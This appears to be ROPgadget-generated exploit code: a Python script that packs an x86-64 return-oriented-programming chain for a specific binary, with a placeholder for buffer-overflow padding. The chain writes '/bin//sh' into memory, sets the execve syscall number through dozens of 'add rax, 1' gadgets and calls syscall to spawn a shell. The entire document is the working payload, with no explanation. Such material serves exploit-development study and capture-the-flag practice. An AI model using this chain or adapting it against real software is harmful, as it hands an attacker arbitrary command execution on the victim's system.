# ROPgadget --ropchain --binary "binary path" > "output path"

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x000000000044e580) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x00000000004434b9) # xor rax, rax ; ret
p += pack('<Q', 0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040186a) # pop rdi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x000000000048e8eb) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004434b9) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401223) # syscall